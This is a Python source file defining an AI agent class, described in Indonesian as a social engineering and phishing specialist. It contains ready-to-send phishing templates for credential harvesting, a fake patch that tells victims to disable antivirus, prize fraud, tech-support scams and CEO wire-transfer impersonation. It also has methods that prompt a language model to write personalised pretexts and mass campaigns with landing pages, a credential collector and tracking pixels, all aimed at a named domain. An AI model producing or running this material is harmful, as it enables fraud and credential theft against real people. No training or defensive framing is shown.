# src/agents/harbinger_social.py
import json
from typing import Dict, Any, List
from .base import VelvetBaseAgent

class HarbingerSocial(VelvetBaseAgent):
    """
    Harbinger Social — Spesialis Social Engineering & Phishing.
    Membuat kampanye phishing, manipulasi psikologis, pretext generation,
    email spoofing, voice cloning, dan otomatisasi rekayasa sosial.
    """
    
    def __init__(self, config: Dict[str, Any], tools: List = None):
        super().__init__(config, tools)
        self.phishing_templates = {
            "credential_harvest": self._gen_cred_harvest,
            "urgent_action": self._gen_urgent_action,
            "fake_reward": self._gen_fake_reward,
            "tech_support": self._gen_tech_support,
            "boss_impersonation": self._gen_boss_impersonation,
        }
    
    def _gen_cred_harvest(self, config: Dict) -> str:
        target_platform = config.get("platform", "Email")
        return f'''
Subject: Urgent: Your {target_platform} Account Requires Immediate Verification

Dear {config.get("target_name", "User")},

We have detected unusual activity on your {target_platform} account. 
To prevent suspension, please verify your identity immediately.

VERIFY ACCOUNT: {config.get("phishing_url", "https://fake-login.example.com")}

This link expires in 24 hours.

Best regards,
{target_platform} Security Team
'''
    
    def _gen_urgent_action(self, config: Dict) -> str:
        return f'''
Subject: CRITICAL: Security Breach Detected

ATTENTION {config.get("target_name", "Employee")},

Our security systems have detected a breach affecting your workstation.
You must run the attached security patch immediately to prevent data loss.

Instructions:
1. Download the attached file
2. Disable your antivirus temporarily
3. Run as Administrator

Failure to comply within 2 hours will result in account termination.

IT Security Department
'''
    
    def _gen_fake_reward(self, config: Dict) -> str:
        return f'''
Subject: Congratulations! You Won {config.get("prize", "$1000 Gift Card")}!

Dear {config.get("target_name", "Winner")},

You have been selected as the winner of our monthly draw!
Your prize: {config.get("prize", "$1000 Amazon Gift Card")}

CLAIM HERE: {config.get("phishing_url", "https://fake-prize.example.com")}

This is a limited time offer.

The Rewards Team
'''
    
    def _gen_tech_support(self, config: Dict) -> str:
        return f'''
Subject: Your Computer is Infected - Call Support Immediately

WARNING: 5 viruses detected on your computer!

Your personal data and banking information are at risk.
Call our certified technicians immediately at:

TOLL-FREE: {config.get("phone", "1-800-FAKE-SUPPORT")}

Do not continue using your computer until we resolve this issue.

Microsoft Certified Support Team
'''
    
    def _gen_boss_impersonation(self, config: Dict) -> str:
        return f'''
Subject: Urgent Task - Need Wire Transfer

{config.get("target_name", "Team Member")},

I'm in a meeting with clients right now and need your help.
Can you process an urgent wire transfer to the account below?

Account: {config.get("account", "XXXX-XXXX-XXXX-XXXX")}
Amount: {config.get("amount", "$15,000")}

I'll send the formal approval when I'm back. This is time-sensitive.

Sent from my iPhone

{config.get("boss_name", "CEO Name")}
CEO, Company Inc.
'''
    
    def generate_pretext(self, target_profile: Dict[str, Any], goal: str) -> str:
        """
        Generate pretext skenario berdasarkan profil target.
        """
        pretext_prompt = f"""
        Buat PRETEXT skenario untuk social engineering:
        
        TARGET PROFILE:
        {json.dumps(target_profile, indent=2)}
        
        GOAL: {goal}
        
        Buat skenario yang:
        1. Personal dan relevan dengan target
        2. Memanfaatkan informasi dari profil target
        3. Menggunakan prinsip psikologi (urgency, authority, scarcity)
        4. Memiliki call-to-action yang jelas
        
        Output dalam format skrip percakapan atau email.
        """
        
        return str(self.agent.run(pretext_prompt))
    
    def generate_phishing_campaign(self, target_list: List[str], template: str) -> Dict[str, Any]:
        """
        Generate kampanye phishing massal.
        """
        campaign_prompt = f"""
        Buat KAMPANYE PHISHING untuk {len(target_list)} target.
        
        TEMPLATE: {template}
        TARGETS: {json.dumps(target_list)}
        
        Buat:
        1. Email phishing yang dipersonalisasi per target
        2. Landing page HTML sederhana
        3. Backend collector script
        4. Tracking pixel
        
        Semua mengarah ke: beulxsm.salbjork.web.id
        """
        
        result = str(self.agent.run(campaign_prompt))
        
        return {
            "template": template,
            "target_count": len(target_list),
            "campaign_material": result
        }
    
    def run(self, task: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        if not context:
            context = {}
        context['agent_type'] = 'social_engineering'
        return super().run(task, context)